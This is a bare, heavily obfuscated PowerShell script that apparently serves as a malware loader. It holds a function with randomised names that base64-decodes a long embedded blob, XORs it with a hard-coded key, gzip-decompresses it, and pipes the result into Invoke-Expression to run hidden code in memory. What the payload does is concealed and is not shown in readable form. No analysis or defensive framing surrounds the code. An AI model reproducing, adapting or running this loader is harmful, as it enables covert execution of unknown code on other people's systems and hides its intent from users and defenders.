$5g1cw79bf62ldhv = [System.Text.Encoding]::ascii
function eck70z16a58mrxldojwsgpthufy  {param($pwuf18riyb4nsev )
  $2zs4vt10bpgq93m = [System.Convert]::FromBase64String($pwuf18riyb4nsev)
  $7auvs9m5ebw6hyr= $5g1cw79bf62ldhv.GetBytes("svkxpmw2rldt")
    $wz2yc74vm3r8tuk = $2zs4vt10bpgq93m
    $cpgh4n6stfvmb29 = $(for ($vxcmz0yjqtr8au7 = 0; $vxcmz0yjqtr8au7 -lt $wz2yc74vm3r8tuk.length; ) {
        for ($r6mutoqvp2178jl = 0; $r6mutoqvp2178jl -lt $7auvs9m5ebw6hyr.length; $r6mutoqvp2178jl++) {
            $wz2yc74vm3r8tuk[$vxcmz0yjqtr8au7] -bxor $7auvs9m5ebw6hyr[$r6mutoqvp2178jl]
            $vxcmz0yjqtr8au7++
            if ($vxcmz0yjqtr8au7 -ge $wz2yc74vm3r8tuk.Length) {
                $r6mutoqvp2178jl = $7auvs9m5ebw6hyr.length
            }
        }
    })
	$91lvpydso5akhfc = New-Object System.IO.MemoryStream( , $cpgh4n6stfvmb29 )

	    $cr6jfdtna5qshxi = New-Object System.IO.MemoryStream
        $s60dm2984uty7wg = New-Object System.IO.Compression.GzipStream $91lvpydso5akhfc, ([IO.Compression.CompressionMode]::Decompress)
	    $s60dm2984uty7wg.CopyTo( $cr6jfdtna5qshxi )
        $s60dm2984uty7wg.Close()
		$91lvpydso5akhfc.Close()
		[byte[]] $9wy0kdsztfcbih1 = $cr6jfdtna5qshxi.ToArray()
 $dnczrp84qe0yf3s=$9wy0kdsztfcbih1
    return $dnczrp84qe0yf3s
}
[byte[]]$slid0xemkj9rp35=eck70z16a58mrxldojwsgpthufy $5o7n9l63v1z2ump
[System.Text.Encoding]::ascii.GetString((eck70z16a58mrxldojwsgpthufy "bP1jeHBtdzJ2bOkhKhnIMGATKRaML82RJoYROIj16/jxgUX9FJUHdhsKAQ+jxGkZG+1ANZNOLs2FQWpTfejs+HQZAsclMxkhrt7h8odZel+7z3Rm9DlMRAU/9yUnbdgWWR7LrSqiPlVT94JQBeklorFK3zc+FvUnXMoBcQU+uJcCYofzBlQyGPy1PSgkBCN6fKusqyP3r65p+yiCpeROYoHUREfPJaw8TtX72YBEHxdchIh9eznl5cXaV8fgIHreMZNIWW/JN7nEmY8zkvRi8W56VTgIWAXz7qTO8i5CZO4eVbLivNveBaQ0c18DQLeNtEW1+15sznov4xJk29AmW/F/W2QEnAjaFDk5ZKOZf1W+X7zHmci3GxOVW0bXG2IBq+fHOGXqNhjRyyGoGWh2t4x/wli/Pa8ezdQ+xWrgAMrNvgEolo1jghToM4SSj06cEHPbys68Dw3tW6/qVViwr5RXuFD9HXoQLOIhip+6G+z0iYNSnKg8iz5YSOjnt0ERTJpVfePEf20zOQHXzanE+0D8o8UnicHsq8tgYCXEfihIvxd5hy+vO6BZBOdEYWfrVAMD+HaL3eG+qvvPqIcKRk6vhk3yKJEPN/5pqIs8bXga2mSZzLWgoIbFD56PsLBVJNdd9dmZl66mNNxM1geHKDkSY8P7xmAH9BWWC9eyBU2pi0jgUnuzgbG//CALvFxEq/x20PoNNoYSViNxUvFwIbO2aE1qHba45Iw3GuxxHCnTLegTbeUHAlkd1qxTDlmF10c8VOiiOXaukjjC8EfhMo38jTGU5OP2N0TLpxZU5x5ybZkbmdEHd3OZGg9Tt7/tpc+JziPL8O2mHZClSRDLq1QMtvYtb01PEYZ8ZjEsW2rgDHX5eJjYXO9MEJhAwqiKuJVCQhCOLxlbxEkzomFF4F1OxuR49vvUJ/S/aXAb0hluHgdSAB9HDB/aRZ97ltih8mJ2uywBl4XtbZ2ubPKo3hljmJ5d+9m6tjMcGC5CmvlZm/ubjk2gxu2g8G+l0NKanLqqBYKQvW+MBanYaN0MdssmzEGhdzjmxIU3LZIFvnaQXbvz41ueeaLXYmP+y5YOKHcpSm6Vdc909WXFJUd8MKQLIGqqu4bkn6wduj5LrpdY7xRlvu+VVZCuhfXg5f8+VQQ7e7dTYTrMndSpif93FKTQ++pl4C5YEyHTEfDdoC6JhTPV+Xv8Fz4zm/rBrpBLtlpS/C9qdzI="))|iex;